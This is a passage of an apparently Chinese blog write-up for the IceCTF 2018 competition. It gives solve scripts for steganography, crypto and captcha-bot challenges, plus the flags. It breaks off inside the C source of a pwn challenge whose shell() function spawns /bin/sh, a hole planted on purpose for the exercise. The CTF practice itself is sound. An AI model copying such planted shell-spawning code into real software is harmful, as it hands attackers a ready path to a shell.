class="number">3</span>)[x]) <span class="keyword">for</span> x <span class="keyword">in</span> range(len(s))])).encode(<span class="string">'utf-8'</span>)).decode(<span class="string">'utf-8'</span>)[::<span class="number">-1</span>]*<span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    print(encode(sys.argv[<span class="number">1</span>]))</span><br></pre></td></tr></table></figure><p>嗯，好像有点难理解，其实挺简单的：<code>([5,-1,3,-3,2,15,-6,3,9,1,-3,-5,3,-15] * 3)</code>这一串是字典列表，假设密文中每个字符所在的位置为x，<code>[chr(ord(s[x])+([5,-1,3,-3,2,15,-6,3,9,1,-3,-5,3,-15] * 3)[x]) for x in range(len(s))]</code>那这一串，就是密文中每个字符的ascii对应数值加上字典列表中位置为x的数值之和对应的ascii字符。比如明文为<code>‘IceCTF{’</code>，对应的ascii数值分别为73、99、101、67、84、70、123，经过上面的方法计算后的结果就是78、98、104、64、86、85、117，对应的ascii字符组合起来为<code>‘Nbh@VUu’</code>。至于后面的，就是base64后加密结果*5次的字符串。至于此题解密过程，自己想想好啦。下面放出解密脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(filename, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        s = f.readline().strip()</span><br><span class="line">        <span class="comment">#print(s)</span></span><br><span class="line">        <span class="keyword">return</span> base64.b64encode((<span class="string">''</span>.join([chr(ord(s[x])+([<span class="number">5</span>,<span class="number">-1</span>,<span class="number">3</span>,<span class="number">-3</span>,<span class="number">2</span>,<span class="number">15</span>,<span class="number">-6</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">-3</span>,<span class="number">-5</span>,<span class="number">3</span>,<span class="number">-15</span>] * <span class="number">3</span>)[x]) <span class="keyword">for</span> x <span class="keyword">in</span> range(len(s))])).encode(<span class="string">'utf-8'</span>))<span class="comment">#.decode('utf-8')[::-1]</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(filename, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        s = f.readline().strip()</span><br><span class="line">        s=s[::<span class="number">-1</span>]</span><br><span class="line">        print(s)</span><br><span class="line">        s = base64.b64decode(s.encode(<span class="string">'utf-8'</span>)).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">        print(s)</span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        #ss='IceCTF&#123;'</span></span><br><span class="line"><span class="string">        for x in range(len(s)):</span></span><br><span class="line"><span class="string">            print(ord(s[x]))</span></span><br><span class="line"><span class="string">            print((ord(s[x]) - ([5, -1, 3, -3, 2, 15, -6, 3, 9, 1, -3, -5, 3, -15] * 3)[x]))</span></span><br><span class="line"><span class="string">            print(chr(ord(s[x]) - ([5, -1, 3, -3, 2, 15, -6, 3, 9, 1, -3, -5, 3, -15] * 3)[x]))</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        flag=<span class="string">''</span></span><br><span class="line">        flag+=(<span class="string">''</span>.join([chr(ord(s[x]) - ([<span class="number">5</span>, <span class="number">-1</span>, <span class="number">3</span>, <span class="number">-3</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">-6</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">-3</span>, <span class="number">-5</span>, <span class="number">3</span>, <span class="number">-15</span>] * <span class="number">3</span>)[x]) <span class="keyword">for</span> x <span class="keyword">in</span> range(len(s))]))</span><br><span class="line">        <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment">#print(encode('haha.txt'))#测试文件haha.txt</span></span><br><span class="line">    print(decode(<span class="string">'hzpxbsklqvboyou'</span>))</span><br></pre></td></tr></table></figure><p>运行脚本，得到答案</p><p><img src="/2018/09/18/Icectf2018-writeup/1536290653712.png" alt="1536290653712"></p><p>最终答案：<code>IceCTF{good_ol_history_lesson}</code></p><h4 id="Steganography"><a href="#Steganography" class="headerlink" title="Steganography"></a>Steganography</h4><h5 id="1-Drumbone"><a href="#1-Drumbone" class="headerlink" title="1.Drumbone"></a>1.Drumbone</h5><p><strong>DESCRIPTION</strong></p><p><code>I joined a couple of hacking channels on IRC and I started recieving these strange messages. Someone sent me this image. Can you figure out if there&#39;s anything suspicous hidden in it?</code></p><p>题目给了个<code>drumbone.png</code>长这样</p><p><img src="/2018/09/18/Icectf2018-writeup/1536294501244.png" alt="1536294501244"></p><p>StegSlove变色通道看看，发现<code>Blue plane 0</code> 有个类似二维码的东西</p><p><img src="/2018/09/18/Icectf2018-writeup/1536294567990.png" alt="1536294567990"></p><p>搞鼓半天，没扫出来。后面保存为<code>Solved.bmp</code>拖到<strong>画图</strong>工具里面</p><p><img src="/2018/09/18/Icectf2018-writeup/1536294644335.png" alt="1536294644335"></p><p>缩小成50%，然后保存，再拖到Fireworks，再缩小成33%</p><p><img src="/2018/09/18/Icectf2018-writeup/1536294760288.png" alt="1536294760288"></p><p>识别二维码，扫出答案</p><p><img src="/2018/09/18/Icectf2018-writeup/1536294871007.png" alt="1536294871007"></p><p>最终答案：<code>IceCTF{Elliot_has_been_mapping_bits_all_day}</code></p><p>此题还有大佬解法为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">img = Image.open(<span class="string">'drumbone.png'</span>)</span><br><span class="line">pixels = img.load()</span><br><span class="line"></span><br><span class="line">(w,h) = img.size</span><br><span class="line">print(w,h)</span><br><span class="line"></span><br><span class="line">outimg_r = Image.new(<span class="string">'RGB'</span>, (w,h), <span class="string">"white"</span>)</span><br><span class="line">outimg_g = Image.new(<span class="string">'RGB'</span>, (w,h), <span class="string">"white"</span>)</span><br><span class="line">outimg_b = Image.new(<span class="string">'RGB'</span>, (w,h), <span class="string">"white"</span>)</span><br><span class="line"></span><br><span class="line">pixels_r = outimg_r.load()</span><br><span class="line">pixels_g = outimg_g.load()</span><br><span class="line">pixels_b = outimg_b.load()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,w):</span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,h):</span><br><span class="line">    (r,g,b) = pixels[i,j]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> r&amp;<span class="number">1</span>:</span><br><span class="line">        pixels_r[i,j] = (<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> g&amp;<span class="number">1</span>:</span><br><span class="line">        pixels_g[i,j] = (<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> b&amp;<span class="number">1</span>:</span><br><span class="line">        pixels_b[i,j] = (<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">outimg_r.save(<span class="string">"outimg_r.png"</span>)</span><br><span class="line">outimg_g.save(<span class="string">"outimg_g.png"</span>)</span><br><span class="line">outimg_b.save(<span class="string">"outimg_b.png"</span>)</span><br></pre></td></tr></table></figure><p>其中得到的有张图片是这样的</p><p><img src="/2018/09/18/Icectf2018-writeup/1536899860339.png" alt="1536899860339"></p><p>然后，再修改下代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">img = Image.open(<span class="string">'drumbone.png'</span>)</span><br><span class="line">pixels = img.load()</span><br><span class="line"></span><br><span class="line">(w,h) = img.size</span><br><span class="line">outimg_b = Image.new(<span class="string">'RGB'</span>, (w,h), <span class="string">"white"</span>)</span><br><span class="line">pixels_b = outimg_b.load()</span><br><span class="line"></span><br><span class="line">wout = <span class="number">-1</span></span><br><span class="line">hout = <span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,w,<span class="number">6</span>):</span><br><span class="line">  wout += <span class="number">1</span></span><br><span class="line">  hout = <span class="number">-1</span></span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,h,<span class="number">6</span>):</span><br><span class="line">    hout+=<span class="number">1</span></span><br><span class="line">    (r,g,b) = pixels[i,j]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> b&amp;<span class="number">1</span>:</span><br><span class="line">        pixels_b[wout,hout] = (<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">outimg_b = outimg_b.resize((<span class="number">10</span>*w,<span class="number">10</span>*h))</span><br><span class="line">outimg_b.save(<span class="string">"outimg_d.png"</span>)</span><br></pre></td></tr></table></figure><p>直接生成出二维码</p><p><img src="/2018/09/18/Icectf2018-writeup/1536900301308.png" alt="1536900301308"></p><h5 id="2-Hot-or-Not（复现失败）"><a href="#2-Hot-or-Not（复现失败）" class="headerlink" title="2.Hot or Not（复现失败）"></a>2.Hot or Not（复现失败）</h5><p><strong>DESCRIPTION</strong></p><p>According to my friend Zuck, the first step on the path to great power is to rate the relative hotness of stuff… think Hot or Not.</p><p>给了一个非常之大的图片（估计是通过CV2将图片拼接起来的）</p><p><img src="/2018/09/18/Icectf2018-writeup/1536896085378.png" alt="1536896085378"></p><p>然后，不会，复现也失败，相关<a href="https://github.com/shiltemann/CTF-writeups-public/blob/master/IceCTF-2018/writeup.md#steganography-300-hot-or-not" target="_blank" rel="noopener">writeup</a>。</p><h5 id="3-Rabbit-Hole（复现失败）"><a href="#3-Rabbit-Hole（复现失败）" class="headerlink" title="3.Rabbit Hole（复现失败）"></a>3.Rabbit Hole（复现失败）</h5><p><strong>DESCRIPTION</strong></p><p>Here’s a picture of my favorite vegetable. I hope it doesn’t make you cry.</p><p><img src="/2018/09/18/Icectf2018-writeup/1536297622538.png" alt="1536297622538"></p><p>尝试使用工具<code>steghide</code>查看下信息</p><p><img src="/2018/09/18/Icectf2018-writeup/1536297958844.png" alt="1536297958844"></p><p>但是好像需要密码，想起题目是一张洋葱的图片，洋葱英译<code>onion</code>，有没可能这个是密码？执行命令<code>steghide --info rabbithole.jpg -p onion</code></p><p><img src="/2018/09/18/Icectf2018-writeup/1536298112927.png" alt="1536298112927"></p><p>果然有个<code>address.txt</code>，尝试提取出来，执行命令<code>steghide extract -sf rabbithole.jpg</code> </p><p><img src="/2018/09/18/Icectf2018-writeup/1536298163429.png" alt="1536298163429"></p><p>文件内容为<code>wsqxiyhn23zdi6ia</code>，然后百思不得其解，直到比赛结束，依旧无解。</p><p>后面的一系列踩坑操作，发现是这个意思因为图片是个洋葱，<code>onion</code>。上面那个<code>address.txt</code>中的内容即访问</p><p><code>http://wsqxiyhn23zdi6ia.onion</code>，但是前提是需要下载个<code>onion brower</code>的客户端。第二种方法是，直接访问 <code>https://onion.link/</code> ，然后搜索<code>wsqxiyhn23zdi6ia.onion</code>，你会找到<code>https://wsqxiyhn23zdi6ia.onion.link/</code></p><p><img src="/2018/09/18/Icectf2018-writeup/1536890641270.png" alt="1536890641270"></p><p>访问它，你会得到接下来需要解密的数据。</p><p><img src="/2018/09/18/Icectf2018-writeup/1536890493178.png" alt="1536890493178"></p><p>嗯，是的就是这一坨。好吧，先复制下来吧，没思路，继续网上搜索。找啊找，找到外婆桥，你会找到个<a href="https://github.com/qntm/base65536" target="_blank" rel="noopener">github的项目</a>，好的，按照提示，先行下载。（歪果仁真会玩）</p><p>然后通过命令，<code>base65536</code>的转化得到一个<code>zip</code>文件，文件之中搜索<code>flag</code>格式<code>IceCTF</code>，执行命令<code>strings *| grep &quot;IceCTF&quot;</code>，即可得到答案。</p><p>以下是此题的坑点：</p><p>stegdetect安装时ubuntu下出现部分不兼容情况</p><p><a href="https://github.com/poizan42/stegdetect" target="_blank" rel="noopener">https://github.com/poizan42/stegdetect</a></p><p><img src="/2018/09/18/Icectf2018-writeup/1536325373114.png" alt="1536325373114"></p><h4 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h4><h5 id="1-Hello-World"><a href="#1-Hello-World" class="headerlink" title="1.Hello World!"></a>1.Hello World!</h5><p><strong>DESCRIPTION</strong></p><p>Welcome to the competition! To get you started we decided to give you your first flag. The flags all start with the “IceCTF” and have some secret message contained with in curly braces “{“ and “}”.</p><p>Within this platform, the challenges will be shown inside a frame to the right. For example purposes the download interface is shown on the right now. For static challenges you will need to click the large button in order to receive your challenge. For non static challenges, the lab itself will be shown on the right.</p><p>To submit the flag you can click the blue flag button in the bottom right hand corner.</p><p>Your flag is <code>IceCTF{this_is_a_flag}</code></p><h5 id="2-anticaptcha"><a href="#2-anticaptcha" class="headerlink" title="2.anticaptcha"></a>2.anticaptcha</h5><p><strong>DESCRIPTION</strong></p><p>Wow, this is a big captcha. Who has enough time to solve this? Seems like a lot of effort to me!</p><p>这题其实可以做出来的，脚本都写好了，回显总是一个错误</p><p>脚本如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">#-*-coding:utf-8</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">import math</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def gcd(a,b):</span><br><span class="line">    if a%b == 0:</span><br><span class="line">        return b</span><br><span class="line">    else :</span><br><span class="line">        return gcd(b,a%b)</span><br><span class="line">def isPrime(n):</span><br><span class="line">  if n &lt;= 1:</span><br><span class="line">    return False</span><br><span class="line">  for i in range(2, int(math.sqrt(n)) + 1):</span><br><span class="line">    if n % i == 0:</span><br><span class="line">        return False</span><br><span class="line">  return True</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">S=&quot;&quot;</span><br><span class="line">url=&apos;https://3rf0c2v1ztr0i6v-anticaptcha.labs.icec.tf/&apos;</span><br><span class="line"></span><br><span class="line">s=requests.session()</span><br><span class="line">r=s.get(url)</span><br><span class="line">#print r.text</span><br><span class="line"></span><br><span class="line">page_text = r.text</span><br><span class="line">#print page_text</span><br><span class="line">soup = BeautifulSoup(page_text,&apos;html.parser&apos;)</span><br><span class="line">#print soup</span><br><span class="line">tags = soup.find_all(&apos;td&apos;)</span><br><span class="line">#print tags</span><br><span class="line">sum=0</span><br><span class="line">for i in range(0,len(tags),2):</span><br><span class="line">    #print str(sum)</span><br><span class="line">    s1= str(tags[i]).lstrip(&quot;&lt;td&gt;&quot;).rstrip(&quot;&lt;/td&gt;&quot;)</span><br><span class="line">    #print s1</span><br><span class="line">    if &apos;greatest common divisor&apos; in s1:</span><br><span class="line">        #print s1.split(&apos; &apos;)[7],s1.split(&apos; &apos;)[9][:-1]</span><br><span class="line">        n, m=int(s1.split(&apos; &apos;)[7]), int(s1.split(&apos; &apos;)[9][:-1])</span><br><span class="line">        #print gcd(n,m)</span><br><span class="line">        s2=gcd(n,m)</span><br><span class="line">    elif &apos;prime number&apos; in s1:</span><br><span class="line"></span><br><span class="line">        #print s1.split(&apos; &apos;)[1]</span><br><span class="line">        n=int(s1.split(&apos; &apos;)[1])</span><br><span class="line">        #print isPrime(n)</span><br><span class="line">        if isPrime(n):</span><br><span class="line">            #print &apos;true&apos;</span><br><span class="line">            s2=&apos;true&apos;</span><br><span class="line">        else:</span><br><span class="line">            #print &apos;false&apos;</span><br><span class="line">            s2=&apos;false&apos;</span><br><span class="line">    elif &apos;in the following line&apos; in s1:</span><br><span class="line">        s1 = s1.replace(&apos;\n&apos;, &apos; &apos;)</span><br><span class="line">        #print s1.split(&apos; &apos;)</span><br><span class="line">        #print s1.split(&apos; &apos;)[3][:-2]</span><br><span class="line">        word=s1.split(&apos; &apos;)[3+5+int(s1.split(&apos; &apos;)[3][:-2])]</span><br><span class="line">        if &apos;.&apos; in word:</span><br><span class="line">            word=word[:-1]</span><br><span class="line">        #print word</span><br><span class="line">        s2=word</span><br><span class="line">    elif &apos;What year is it?&apos; in s1:</span><br><span class="line">        #print &apos;2018&apos;</span><br><span class="line">        s2=&apos;2018&apos;</span><br><span class="line">    elif &apos;What color is the sky?&apos; in s1:</span><br><span class="line">        #print &apos;blue&apos;</span><br><span class="line">        s2 =&apos;blue&apos;</span><br><span class="line">    elif &apos;What is the tallest mountain on Earth?&apos; in s1:</span><br><span class="line">        #print &apos;Mount Everest&apos;</span><br><span class="line">        s2 =&apos;Mount Everest&apos;</span><br><span class="line">    elif &apos;How many planets are between Earth and the Sun?&apos; in s1:</span><br><span class="line">        #print &apos;2&apos;</span><br><span class="line">        s2 =&apos;2&apos;</span><br><span class="line">    elif &apos;Which planet is closest to the sun?&apos; in s1:</span><br><span class="line">        #print &apos;Mercury&apos;</span><br><span class="line">        s2 =&apos;Mercury&apos;</span><br><span class="line">    elif &apos;How many strings does a violin have?&apos; in s1:</span><br><span class="line">        #print &apos;4&apos;</span><br><span class="line">        s2 =&apos;4&apos;</span><br><span class="line">    elif &apos;What is the capital of Germany?&apos; in s1:</span><br><span class="line">        #print &apos;Berlin&apos;</span><br><span class="line">        s2 =&apos;Berlin&apos;</span><br><span class="line">    elif &apos;Who directed the movie Jaws?&apos; in s1:</span><br><span class="line">        #print &apos;Steven Allan Spielberg&apos;</span><br><span class="line">        &apos;&apos;&apos;Steven Spielberg&apos;&apos;&apos;</span><br><span class="line">        s2 =&apos;Steven Spielberg&apos;</span><br><span class="line">    elif &apos;What is the capital of Hawaii?&apos; in s1:</span><br><span class="line">        #print &apos;Honolulu&apos;</span><br><span class="line">        s2 =&apos;Honolulu&apos;</span><br><span class="line">    else:</span><br><span class="line">        print &apos;other!!!!&apos;</span><br><span class="line">    if i==0:</span><br><span class="line">        S+=str(sum)+&apos;=&apos;+str(s2)</span><br><span class="line">    else:</span><br><span class="line">        S +=&apos;&amp;&apos; + str(sum) + &apos;=&apos; + str(s2)</span><br><span class="line">    sum+=1</span><br><span class="line"></span><br><span class="line">print S</span><br><span class="line">#S=&quot;0=grow&quot;</span><br><span class="line">data=&#123;&apos;answer&apos;:S,&apos;submit&apos;:&apos;Submit+Answers&apos;&#125;</span><br><span class="line"></span><br><span class="line">rr=requests.post(url=url,data=data)</span><br><span class="line">print rr.text</span><br><span class="line">#print &apos;\n&apos;.join(rr.text.split(&apos;\n&apos;)[10:20])</span><br></pre></td></tr></table></figure><p>不过我原先<code>Who directed the movie Jaws?</code>答案是<code>Steven Allan Spielberg</code>，而题目答案是<code>Steven Spielberg</code>，(╯﹏╰)b</p><p><img src="/2018/09/18/Icectf2018-writeup/1536898223024.png" alt="1536898223024"></p><p>贼郁闷，这就是百度和谷歌的差吧。</p><p><img src="/2018/09/18/Icectf2018-writeup/1536898347612.png" alt="1536898347612"></p><h4 id="Cryptography"><a href="#Cryptography" class="headerlink" title="Cryptography"></a>Cryptography</h4><h5 id="1-garfeld"><a href="#1-garfeld" class="headerlink" title="1.garfeld"></a><strong>1.garfeld</strong></h5><p><strong>DESCRIPTION</strong></p><p><code>You found the marketing campaign for a brand new sitcom. Garfeld! It has a secret message engraved on it. Do you think you can figure out what they&#39;re trying to say?</code></p><p>给了个<a href="https://static.icec.tf/garfield/garfeld.png" target="_blank" rel="noopener">garfeld.png</a>，按照题目的意思，应该是要解密图片下方给的那串字符串</p><p><img src="/2018/09/18/Icectf2018-writeup/1536396546979.png" alt="1536396546979"></p><p>抠出来下<code>IjgJUO{P_LOUV_AIRUS_GYQUTOLTD_SKRFB_TWNKCFT}</code>，开始以为是替换密码，搞鼓半天，后面可爱的队友“咦！为什么图片右上角有一串数字<code>07271978</code>”，手动推测一番，发现了其中的奥秘。</p><p><img src="/2018/09/18/Icectf2018-writeup/1536397118828.png" alt="1536397118828"></p><p>即可推出正确答案：<code>IceCTF{I_DONT_THINK_GRONSFELD_LIKES_MONDAYS}</code></p><h5 id="2-Ancient-Foreign-Communication（未完待续）"><a href="#2-Ancient-Foreign-Communication（未完待续）" class="headerlink" title="2.Ancient Foreign Communication（未完待续）"></a>2.Ancient Foreign Communication（未完待续）</h5><p><strong>DESCRIPTION</strong></p><p>We got word from a friend of ours lost in the depths of the Andorran jungles! Help us figure out what he is trying to tell us before its too late!<br>Note: The flag here is non-standard, in the result you should end up with some words! The flag is IceCTF{&lt;words, lowercase, including spaces&gt;}</p><p>题目给出的文本如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E2 A8 85 5D 5D E2 8C 9E E2 8C 9E E2 8C 9F 5B E2 A8 86 5D E2 8C 9F 5D 5D 5D E2 A8 86 E2 A8 86 E2 A8 86 E2 8C 9C 5B 5B 5B E2 8C 9D E2 8C 9D E2 8C 9D E2 8C 9E E2 8C 9D E2 8C 9D E2 8C 9D E2 8C 9D E2 A8 86 E2 8C 9D E2 8C 9D E2 8C 9D E2 8C 9E E2 8C 9E E2 8C 9D E2 8C 9D E2 8C 9D E2 8C 9D E2 8C 9F E2 8C 9D E2 8C 9D E2 A8 85 E2 A8 85 E2 8C 9E E2 8C 9E E2 A8 86 5B 5D 5D 5D E2 8C 9D E2 8C 9D E2 8C 9D E2 8C 9D 5D 5D E2 8C 9F 5B 5B 5B E2 8C 9D E2 8C 9D E2 8C 9D E2 8C 9D E2 8C 9F E2 8C 9D E2 8C 9D E2 8C 9D E2 8C 9D 5D 5D 5D E2 8C 9E E2 8C 9E E2 8C 9E E2 8C 9D E2 8C 9D E2 8C 9D E2 A8 86 5D E2 8C 9E E2 8C 9E</span><br></pre></td></tr></table></figure><p>保存为<code>comms.txt</code>，然后<code>xxd</code>下，写入<code>comms_new.txt</code>中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxd -r -p comms.txt &gt; comms_new.txt</span><br></pre></td></tr></table></figure><p>其中<code>comms_new.txt</code>内容为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">⨅]]⌞⌞⌟[⨆]⌟]]]⨆⨆⨆⌜[[[⌝⌝⌝⌞⌝⌝⌝⌝⨆⌝⌝⌝⌞⌞⌝⌝⌝⌝⌟⌝⌝⨅⨅⌞⌞⨆[]]]⌝⌝⌝⌝]]⌟[[[⌝⌝⌝⌝⌟⌝⌝⌝⌝]]]⌞⌞⌞⌝⌝⌝⨆]⌞⌞</span><br></pre></td></tr></table></figure><h4 id="Binary-Exploitation"><a href="#Binary-Exploitation" class="headerlink" title="Binary Exploitation"></a>Binary Exploitation</h4><h5 id="1-Cave"><a href="#1-Cave" class="headerlink" title="1.Cave"></a>1.Cave</h5><p><strong>DESCRIPTION</strong></p><p>You stumbled upon a cave! I’ve heard some caves hold secrets.. can you find the secrets hidden within its depths?</p><p>这算是和队友做出来的第一个<code>pwn</code>题，让我先记住这个时间<code>2018</code>年<code>09</code>月<code>11</code>日<code>21</code>时<code>30</code>分<code>xx</code>时。</p><p>先看题目给出的源码</p><p><img src="/2018/09/18/Icectf2018-writeup/1536673525281.png" alt="1536673525281"></p><p>源代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">gid_t</span> gid = getegid();</span><br><span class="line">    setresgid(gid, gid, gid);</span><br><span class="line">    system(<span class="string">"/bin/sh -i"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">message</span><span class="params">(<span 